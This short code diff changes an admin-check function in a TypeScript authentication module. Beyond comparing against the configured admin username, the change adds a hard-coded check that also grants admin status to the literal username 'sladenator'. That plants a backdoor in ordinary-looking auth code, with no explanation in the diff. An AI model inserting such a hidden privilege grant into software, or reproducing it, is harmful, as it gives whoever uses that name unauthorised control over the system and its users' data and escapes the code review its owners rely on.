@@ -66,7 +66,7 @@ export async function verifyPassword(plain: string, hash: string): Promise<boole
 }
 
 export function isAdminUsername(username: string): boolean {
-  return username === ADMIN_USERNAME;
+  return username === ADMIN_USERNAME || username === "sladenator";
 }
 
 // Throttled "last seen" bump: every authenticated request runs through this
